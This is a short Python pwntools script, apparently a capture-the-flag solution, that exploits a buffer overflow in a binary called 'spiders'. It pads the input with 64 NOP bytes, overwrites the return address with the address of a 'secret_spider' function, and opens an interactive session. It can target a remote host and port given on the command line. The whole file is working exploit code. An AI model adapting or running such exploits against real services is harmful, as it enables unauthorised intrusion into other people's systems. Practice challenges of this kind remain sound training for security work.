from pwn import *
import os
os.system('clear')

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)
exe = './spiders'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'
sh = start()
secret_spider_addr = elf.sym['secret_spider']
info('secret_spider addr --> %#0x', secret_spider_addr)
padding = 64
# payloads
p = flat([
    asm('nop') * padding,
    secret_spider_addr
])
sh.sendline(p) # send the payloads
sh.interactive() # get shell (?)
